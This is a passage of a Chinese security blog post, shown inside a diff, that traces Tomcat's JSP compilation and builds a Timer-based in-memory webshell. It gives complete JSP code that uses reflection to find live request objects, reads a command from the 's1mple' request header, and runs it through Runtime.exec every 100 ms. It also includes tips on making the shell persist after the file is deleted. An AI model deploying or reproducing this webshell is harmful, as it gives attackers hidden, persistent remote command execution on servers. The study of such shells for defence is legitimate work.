class="comment">//重新编译</span></span><br><span class="line">            <span class="keyword">this</span>.jsw.setReload(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">this</span>.jsw.setCompilationException((JasperException)<span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JasperException var3) &#123;</span><br><span class="line">            <span class="keyword">this</span>.jsw.setCompilationException(var3);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.options.getDevelopment() &amp;&amp; <span class="keyword">this</span>.options.getRecompileOnFail()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.jsw.setLastModificationTest(-<span class="number">1L</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            JasperException je = <span class="keyword">new</span> JasperException(Localizer.getMessage(<span class="string">&quot;jsp.error.unable.compile&quot;</span>), var5);</span><br><span class="line">            <span class="keyword">this</span>.jsw.setCompilationException(je);</span><br><span class="line">            <span class="keyword">throw</span> je;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用 <code>getServlet()</code> 获取访问的 jsp 生成的 servlet 类实例。后续会调用 servlet 实例的 <code>service</code> 方法。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L8yGbn"><img src="https://s1.ax1x.com/2022/04/15/L8yGbn.png" alt="L8yGbn.png"></a></p>
+<p>在getServlet中会又判断了页面是否有修改，如果修改则需要进行 reload，会先调用 destroy 方法销毁之前的类实例，再进行重新加载。加载是使用了 InstanceManager 调用 <code>org.apache.jasper.servlet.JasperLoader</code> 来进行 loadClass。具体代码可看如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">newInstance</span><span class="params">(String className, ClassLoader classLoader)</span> <span class="keyword">throws</span> IllegalAccessException, NamingException, InvocationTargetException, InstantiationException, ClassNotFoundException, IllegalArgumentException, NoSuchMethodException, SecurityException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; clazz = classLoader.loadClass(className);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.newInstance(clazz.getConstructor().newInstance(), clazz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实例化完之后向后调用service方法：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L8hlBF"><img src="https://s1.ax1x.com/2022/04/15/L8hlBF.png" alt="L8hlBF.png"></a></p>
+<p>进行触发；看一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._jspService(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L8hN1x"><img src="https://s1.ax1x.com/2022/04/15/L8hN1x.png" alt="L8hN1x.png"></a></p>
+<p>看到这里就已经很明显了；</p>
+<p>那么基本理解了servlet和timer类型的内存马原理，那么两者是否一样呢；</p>
+<p>答案是：肯定不同</p>
+<p>​    首先来说jsp是servlet不错，但是这个timer在内存中驻留的原因和servlet内存马原理不同，timer驻留的原因是因为有一个计划任务，而servlet驻留的原因也很明白，是因为动态注册的servlet；一个是基于纯内存，一个是基于项目之上的内存；还是有区别的；</p>
+<p>那么删除jsp之后还可执行是因为： Timer 创建的线程在任务没有自然执行完毕，或没有调用结束时，是不会被 GC 的。就类似php中的while的内存马一样；</p>
+<p>​    那么最重要的一点，内存马如果无法实现回显，那么其实没有太大的作用，如果目标不出网，那么就无法很有效的利用；所以这里timer类型的是否可以回显？类比下php的，在while中直接拿到GET的传参然然后执行，那么这里是否也可呢？</p>
+<p>答案：绝对可</p>
+<p>类比一下php的，这里因为是jsp，所以也可直接从request中拿到Header中的固定参数；或者请求参数都可；</p>
+<p>那么现在的问题就是如何拿到相关的参数呢？是否可以直接从request中拿到呢？其实不然，如果一旦我们后期删除了相关的shell.jsp文件，那么就不会在原本的逻辑中形成ServletRequest对象，所以这种方法自然不是很可行；那么现在的思路就是能否拿到原始的请求对象，直接利用反射去获得最原始的tomcat的请求对象；然后拿到对象之后获得其中的请求header；然后去拿到特定的header然后传入我们的恶意payload中；比如什么runtime这样的，其实也是可以的；</p>
+<p>我经过了一些debug；发现有一些可用；</p>
+<p>这个怎么来的，下面我详细的记述一下：</p>
+<p>思路和一般的内存实现一样，先从线程出发，因为请求的处理肯定是由一些线程来处理的，所以既然可以反射，那么就可以考虑从线程角度反推；</p>
+<p>给出我的源码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Field field = <span class="keyword">null</span>;</span><br><span class="line">    Class clazz = Thread.currentThread().getThreadGroup().getClass();<span class="comment">//拿到当前线程的线程组class对象；常规思路；</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Thread[] threads = (Thread[]) field.get(Thread.currentThread().getThreadGroup());<span class="comment">//获取thread的对象；获取当前线程所在组的全部线程</span></span><br><span class="line">        System.out.println(threads);</span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LY3881"><img src="https://s1.ax1x.com/2022/04/16/LY3881.png" alt="LY3881.png"></a></p>
+<p>可以看到已经拿到了很多线程；</p>
+<p>继续向上回溯拿到Runnable对象；拿到这个对象的原因是想要拿到NioEndpoint；了解tomcat的基本架构的应该都知道，在Connector中由三部分组成，其中一部分就是Endpoint；负责处理流；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LY8Zid"><img src="https://s1.ax1x.com/2022/04/16/LY8Zid.png" alt="LY8Zid.png"></a></p>
+<p>经过追溯类，发现thread中的target属性可以考虑使用；使用此属性可以拿到Runnable；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clas = thread.getClass();</span><br><span class="line">                Field thread_field = clas.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                thread_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object obj = thread_field.get(thread);</span><br><span class="line">                <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Runnable) &#123; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因为这里需要去遍历出符合条件的，所以我加了一个循环，直到拿到我们需要的目标为止；接着分析，我们最后的目标肯定是拿到请求的对象；那么拿到NioEndpoint之后又该如何走？可以一直向上追，发现这个类的父类；AbstractEndpoint这个class其中实现了一个接口；这个接口就是我们需要的；看如下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LYJqqf"><img src="https://s1.ax1x.com/2022/04/16/LYJqqf.png" alt="LYJqqf.png"></a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Field field1 = obj.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Object obj1 = field1.get(obj);</span><br><span class="line">                    Field field2=<span class="keyword">null</span>;</span><br><span class="line">                    clazz = obj1.getClass();</span><br><span class="line">                    <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (clazz != Object.class) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                field2 = clazz.getDeclaredField(<span class="string">&quot;handler&quot;</span>);<span class="comment">//拿到handler的对象；</span></span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                                clazz = clazz.getSuperclass();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (field2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个接口的实现类是ConnectionHandler（看上图），已经很明显了；在Tomca中Endpoint主要用来接收网络请求,处理则由ConnectionHandler来执行.ConnectionHandler主要作用是调用对应协议的Processor来处理请求；所以这也就是为什么上面的代码要拿到handler的原因了；就是为了拿到这个class对象；在这个对象里可以看上图我标出来了，有一个global属性，是RequestGroupInfo对象；</p>
+<p>这个对象很让人注意，调试进去看一下；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LYJqqf"><img src="https://s1.ax1x.com/2022/04/16/LYJqqf.png" alt="LYJqqf.png"></a></p>
+<p>global属性的对象拿到之后看一下内部的属性；</p>
+<p>其内部的processors属性；看到其中内部结构为RequestGroupInfo的ArrayList；所以需要一个for循环来处理一下内部的结构，拿到req就行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Object obj2 = field2.get(obj1);</span><br><span class="line">                    Field field3 = obj2.getClass().getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Object obj3 = field3.get(obj2);</span><br><span class="line"></span><br><span class="line">                    Field field4 = obj3.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Object obj4 = field4.get(obj3);</span><br><span class="line">                    System.out.println(obj4);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (IllegalAccessException e)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LY1iSx"><img src="https://s1.ax1x.com/2022/04/16/LY1iSx.png" alt="LY1iSx.png"></a></p>
+<p>走到了这里，其实可操作空间已经很大了；看一下Request这个类下的方法；</p>
+<p>getHeader方法可以直接拿到请求头中的字段，那么到这里，利用点也就很清晰了；拿到header中的固定的字段；然后传入命令语句中；其实到这里基本上整体的流程就已经结束；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LYRAi9"><img src="https://s1.ax1x.com/2022/04/16/LYRAi9.png" alt="LYRAi9.png"></a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Object proccess:obj4)&#123;</span><br><span class="line"></span><br><span class="line">                                Class cal = proccess.getClass();</span><br><span class="line">                                Field req = cal.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                                req.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                                Object target = req.get(proccess);</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Method method = target.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class);</span><br><span class="line">                                    String cmd = (String) method.invoke(target,<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">                                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                                &#125;</span><br><span class="line">                               <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                                    e.printStackTrace();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                                    e.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="前面分析了那么多，最后放出我调试好的Timer内存马；"><a href="#前面分析了那么多，最后放出我调试好的Timer内存马；" class="headerlink" title="前面分析了那么多，最后放出我调试好的Timer内存马；"></a>前面分析了那么多，最后放出我调试好的Timer内存马；</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.InvocationTargetException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Hacker by s1mple&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">returnString</span><span class="params">(List process)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        String cms = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Object proccess : process) &#123;</span><br><span class="line">            Class cal = proccess.getClass();</span><br><span class="line">            Field req = cal.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">            req.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object target = req.get(proccess);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Method method = target.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class);</span><br><span class="line">                String cmd = (String) method.invoke(target, <span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">                cms = cmd;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cms;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">        <span class="function"><span class="keyword">public</span> List <span class="title">returnList</span><span class="params">(Thread[] threads)</span></span>&#123;</span><br><span class="line">            List obj_final = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Class clas = thread.getClass();</span><br><span class="line">                    Field thread_field = clas.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    thread_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Object obj = thread_field.get(thread);</span><br><span class="line">                    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                        Field field1 = obj.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                        field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        Object obj1 = field1.get(obj);</span><br><span class="line">                        Field field2 = <span class="keyword">null</span>;</span><br><span class="line">                        Class clazz = obj1.getClass();</span><br><span class="line">                        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (clazz != Object.class) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    field2 = clazz.getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                                    clazz = clazz.getSuperclass();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (field2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                           <span class="comment">// throw new NoSuchFieldException(&quot;handler&quot;);</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        Object obj2 = field2.get(obj1);</span><br><span class="line">                        Field field3 = obj2.getClass().getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        Object obj3 = field3.get(obj2);</span><br><span class="line">                        Field field4 = obj3.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                        field4.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        List obj4 = (List) field4.get(obj3);</span><br><span class="line">                        obj_final = obj4;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj_final;</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">public</span> Thread[] returnthread()&#123;</span><br><span class="line">    Thread[] result = <span class="keyword">new</span> Thread[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        Class clazz = Thread.currentThread().getThreadGroup().getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Thread[] threads = (Thread[]) field.get(Thread.currentThread().getThreadGroup());</span><br><span class="line">            result = threads;</span><br><span class="line">            <span class="comment">//System.out.println(threads);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    java.util.Timer executeSchedule = <span class="keyword">new</span> java.util.Timer();</span><br><span class="line">    executeSchedule.schedule(<span class="keyword">new</span> java.util.TimerTask() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Thread[] s1mple = returnthread();</span><br><span class="line">            <span class="comment">//printWriter.println(s1mple);</span></span><br><span class="line">            List result_list = returnList(s1mple);</span><br><span class="line">            String cmd = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                cmd = returnString(result_list);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(cmd!=<span class="keyword">null</span>) &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>至于为什么这么来，我最开始写的时候是可以命令执行，但是无法植入内存，相当于是一个jsp木马了；我当时看了下报错；发现是Timer中发生了错误；触发了异常，导致Timer无法植入内存；这里有个小坑点，如果Timer的run里的代码发生错误，将导致此线程无法开启；这个错误也不难理解，原因就是我使用的for循环或者while循环的时候有时候会触发错误；所以为了避免这个错误的发生，我直接将相关的处理流程封装起来，避免错误在run里；所以就可保证run中无报错，但是如果亲手调试会发现最后还会爆出一个空指针错误，原因就是最开始请求的时候Runtime那个点是没参数的，所以如此就会导致空指针错误从而无法植入，但貌似第二次请求就算加上参数也会爆空指针；所以我直接在runtime前判断是否为null；这样就不会报错；最后可植入内存；</p>
+<h2 id="测试效果如下："><a href="#测试效果如下：" class="headerlink" title="测试效果如下："></a>测试效果如下：</h2><p>植入内存</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Lt58OI"><img src="https://s1.ax1x.com/2022/04/16/Lt58OI.png" alt="Lt58OI.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Lt4sIO"><img src="https://s1.ax1x.com/2022/04/16/Lt4sIO.png" alt="Lt4sIO.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Lt5SoT"><img src="https://s1.ax1x.com/2022/04/16/Lt5SoT.png" alt="Lt5SoT.png"></a></p>
